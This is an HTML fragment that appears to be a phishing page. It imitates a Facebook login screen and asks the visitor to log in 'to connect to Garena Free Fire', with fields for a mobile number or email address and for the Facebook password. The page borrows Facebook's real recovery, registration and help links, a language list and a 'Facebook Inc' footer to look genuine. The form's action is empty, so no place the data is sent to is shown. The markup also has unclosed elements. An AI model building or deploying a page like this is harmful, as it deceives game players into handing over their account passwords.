<body>
    <div class="main">
        <header>
            <div class="logo">

        <div class="app-info">

            <p>Log in to your Facebook account to connect to Garena Free Fire</p>
        </div>
        <div class="login-box">
            <form action="">
            <div class="input-box">
                <input type="text" placeholder="Mobile number or email address" name="username">
                <input type="password" placeholder="Facebook password" name="password">
            </div>
            <input type="submit" value="Log in">
            <p><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten password?</a></p>
            <br>
            <p><a href="https://www.facebook.com/reg/">Create account</a></p>
            <p><a href="#">Not now</a></p>
            <p><a href="https://www.facebook.com/help">Help Centre</a></p>
            </form>
        </div>
        <div class="language">
            <ul>
                <li><b>English</b></li>
                <li>हिन्दी</li>
                <li>اردو</li>
                <li>ਪੰਜਾਬੀ</li>
                <li>বাংলা</li>
                <li>ગુજરાતી</li>
                <li>मराठी</li>
                <li>தமிழ்</li>
                <li>తెలుగు</li>
                <li>മലയാളം</li>
                <li>ಕನ್ನಡ</li>
            </ul>
        </div>
        <div class="footer">Facebook Inc</div>
    </div>
